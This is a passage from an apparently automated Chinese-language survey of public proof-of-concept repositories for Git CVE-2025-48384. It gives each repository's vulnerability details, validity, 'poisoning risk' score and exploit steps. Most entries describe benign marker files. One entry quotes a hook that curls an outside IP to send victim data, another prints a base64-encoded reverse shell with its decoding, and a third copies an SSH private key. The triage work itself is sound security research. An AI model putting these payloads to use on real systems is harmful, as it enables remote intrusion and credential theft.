5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384-Git配置注入/代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/代码执行

**影响应用:** Git

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库,并执行含有 post-checkout hook的submodule 初始化

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。该漏洞源于 Git 在处理配置文件时，没有正确处理尾部的回车符（CR）。攻击者可以利用这一点，在子模块路径中添加尾部回车符，导致 Git 将子模块检出到错误的位置。如果攻击者在该位置放置一个符号链接，指向子模块的钩子目录，并子模块包含一个可执行的 `post-checkout` 钩子，那么在检出后，该钩子脚本就会被执行，从而实现远程代码执行。

**有效性：** 根据漏洞描述和提供的漏洞利用代码（`post-checkout` 脚本），可以判断该 POC 代码有效。脚本尝试从攻击者的服务器下载并执行代码。

**投毒风险：** 提供的 `post-checkout` 脚本本身就是漏洞利用的一部分，目的是执行恶意代码。如果该脚本是从攻击者控制的仓库中获取的，那么它自然会执行攻击者想要执行的操作。因此，从这个角度来说，可以说利用本身具有“投毒”性质。更准确地说，这不是传统的供应链投毒，而是漏洞利用的核心部分。脚本的功能是将受害者机器的信息发送到攻击者的服务器（ `curl http://120.46.135.127:50009?z`），因此本身不包含额外的、隐藏的恶意行为。该脚本本身就是后门，旨在执行任意命令。

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库，该配置在子模块路径中包含尾部回车符。
2.  攻击者在恶意仓库中设置一个符号链接，将修改后的子模块路径指向 Git 钩子目录。
3.  攻击者在子模块中包含一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该恶意仓库并执行 `git submodule update --init --recursive` 命令。
5.  Git 将子模块检出到错误的位置，符号链接生效，`post-checkout` 钩子脚本被执行，从而实现远程代码执行。

**风险评估：** 此漏洞风险极高，因为攻击者可以通过诱导用户克隆恶意仓库，在用户机器上执行任意代码。

**项目地址:** [altm4n/cve-2025-48384-hub](https://github.com/altm4n/cve-2025-48384-hub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git Config 注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库，并初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 对配置项中回车符（CR）处理不当。具体来说，当 Git 读取配置值时，会去除尾部的 CRLF。但当写入配置项时，如果值包含尾部 CR，则不会被引用，导致 CR 在后续读取时丢失。这个漏洞可以被利用于子模块初始化过程中。如果子模块的路径包含尾部 CR，修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，那么在检出后，该脚本可能会被意外执行，从而导致任意代码执行。

**POC 分析：**

提供的 POC 包含以下文件：

*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/README.md`：一个普通的 README 文件，可能用于描述 PoC 的用途。
*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/post-checkout`：一个 bash 脚本，当子模块检出后会被执行。脚本的功能很简单，就是创建一个 `/tmp/fishsucks` 文件。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件中的子模块路径包含尾部 CR。
2.  攻击者在该仓库中创建一个子模块，并在该子模块的 `.git/hooks` 目录下放置一个名为 `post-checkout` 的可执行脚本（如提供的POC）。
3.  攻击者创建一个符号链接，将包含尾部 CR 的子模块路径指向该子模块的 `.git/hooks` 目录。
4.  受害者克隆该仓库，并执行 `git submodule init` 和 `git submodule update` 命令。
5.  由于 Git 对尾部 CR 的处理不当，子模块会被检出到错误的位置，并且 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**有效性：**

根据漏洞描述和 POC 代码，该 POC 是有效的。它可以利用 Git 的配置解析漏洞，在受害者机器上执行任意代码。

**投毒风险：**

该POC的目的是创建一个`/tmp/fishsucks`文件,根据POC内容来看，此代码的目的是演示该漏洞，没有发现隐藏的恶意代码，因此投毒风险较低，可以认为是 0%。

**项目地址:** [beishanxueyuan/CVE-2025-48384](https://github.com/beishanxueyuan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，允许攻击者通过构造特殊的 Git 配置文件，在受害者克隆或初始化子模块时执行任意代码。漏洞的根源在于 Git 对配置项中尾部回车符（CR）处理不当。当 Git 读取配置值时，会删除尾部的 CRLF，但写入时，如果值以 CR 结尾，则不会进行引号处理，导致 CR 在后续读取时丢失。如果子模块路径包含尾部 CR，这会导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的 POC 代码 `/tmp/4ddcea7dd1399c323a9fb7a8b3071e04/README.md` 本身并不能直接验证漏洞，它只是一个简单的说明文件。真正的 POC 应该包含能够触发漏洞的恶意 Git 仓库配置和子模块结构。从搜索结果来看，存在可用的 POC。

**投毒风险：**

提供的 README.md 文件本身不包含任何可执行代码，因此直接的投毒风险较低。但是，如果该仓库中存在其他文件（例如恶意的 `.gitmodules` 文件或者钩子脚本），则存在投毒的风险。假设仓库作者在其他文件中隐藏了恶意代码的可能性存在，估计投毒风险为 10%。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含特殊构造的 `.gitmodules` 文件和恶意的子模块钩子脚本的 Git 仓库。
2.  **.gitmodules 构造：**  `.gitmodules` 文件中的子模块路径包含尾部回车符（CR），例如 `path = submodule_path\r`。
3.  **符号链接：** 创建一个符号链接，将 `submodule_path` 指向 `.git/modules/<submodule_name>/hooks`。
4.  **恶意钩子：** 子模块中包含一个 `post-checkout` 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户：** 攻击者诱骗受害者克隆该恶意仓库并初始化子模块（使用 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`）。
6.  **触发漏洞：** 当 Git 初始化子模块时，由于路径中的回车符被错误处理，子模块会被检出到错误的位置。由于存在符号链接，`post-checkout` 钩子会被执行，从而导致任意代码执行。

**项目地址:** [eliox01/CVE-2025-48384](https://github.com/eliox01/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384-Git配置注入与任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库或者提交包含恶意配置的patch

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，没有正确处理回车符 \r，导致在特定情况下（如初始化包含子模块的仓库时），子模块路径被错误解析。攻击者可以利用这一点，通过在子模块路径中注入恶意字符，配合精心构造的符号链接，将子模块检出到非预期位置，例如 Git 钩子目录。如果子模块包含恶意的 post-checkout 钩子脚本，则在检出后会被执行，从而实现任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，此漏洞的利用需要满足一定条件，即需要用户 clone 包含恶意子模块配置的仓库或者提交包含恶意配置的patch。提供的 POC 代码 `/tmp/8746716955bead91920f029f2728e38d/README.md` 仅仅是一个 README 文件，本身不具备任何攻击性，因此不能直接作为有效的 POC。

**投毒风险评估：**
提供的 POC 代码只是一个简单的 README 文件，没有任何可执行代码，因此不存在直接的投毒风险。投毒行为可能存在于更复杂的攻击场景中，比如在精心构造的恶意 Git 仓库中，但仅凭这个 README 文件无法评估其风险。

**利用方式：**
1.  攻击者创建一个包含恶意子模块配置的 Git 仓库，子模块的路径包含回车符 \r。
2.  攻击者创建一个符号链接，将修改后的子模块路径指向 Git 钩子目录（.git/hooks）。
3.  攻击者在子模块中包含一个恶意的 post-checkout 钩子脚本。
4.  受害者 clone 该恶意仓库，Git 初始化子模块时，由于回车符处理不当，子模块被检出到错误的钩子目录。
5.  检出完成后，恶意的 post-checkout 钩子脚本被执行，攻击者从而实现任意代码执行。

**项目地址:** [elprogramadorgt/CVE-2025-48384](https://github.com/elprogramadorgt/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
